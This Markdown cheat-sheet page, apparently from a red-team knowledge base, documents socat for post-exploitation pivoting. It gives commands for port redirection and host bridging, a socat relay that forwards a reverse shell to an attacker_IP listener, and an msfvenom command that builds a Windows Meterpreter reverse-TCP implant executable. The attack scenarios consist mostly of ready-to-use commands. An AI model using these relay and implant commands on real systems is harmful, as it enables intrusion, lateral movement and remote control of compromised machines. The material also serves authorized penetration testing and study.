---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - scenarios
  - cross-platform
  - socat
---
# Socat

## 01 - Usage

### 1.1 - Open Two Listening Ports

```
> socat -v tcp-listen:<local_PORT_1> tcp-listen:<local_PORT_2>
```

### 1.2 - Redirect Port

```
> socat tcp-listen:<local_PORT>,reuseaddr tcp-connect:<target_IP>:<target_PORT>
```

### 1.3 - Bridge Two Hosts

```
> socat -v tcp-connect:<target_IP_1>:<target_PORT_1>,reuseaddr tcp-connect:<target_IP_2>:<target_PORT_2>
```

## 02 - Scenarios

### 2.1 - Port Forward Reverse Shell

```
> socat tcp4-listen:<pivot_PORT>,fork tcp4:<attacker_IP>:<attacker_PORT>
```

Generate a reverse shell with the IP address of the compromised machine to pivot from.

```
userware@hackware-os:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<pivot_IP> lport=<pivot_PORT> -f exe -o implant.exe
```

### 2.2 - Bind Web Server Port

```
> socat tcp-listen:8443,reuseaddr tcp-connect:<webserver_IP>:443
```

Then use `curl` to check connect to the pivot server.

```
userware@hackware-os:~$ curl -k https://<pivot_IP>:8443
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Cross Platform/Payloads/One-Liners/Netcat Variants/Socat]]

### Internal All The Things

- [InternalAllTheThings: Network Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

- [Artkond Pivoting Guide](https://artkond.com/2017/03/23/pivoting-guide/)

- [SevenLayers: Socat Reverse Shell Relay](https://sevenlayers.com/index.php/blog/500-socat-reverse-shell-relay)

- [CyberSec Wikimandine: Socat](https://amandinegh.gitbook.io/cyberadventure/internal/pivoting-tunneling-and-port-forwarding/socat)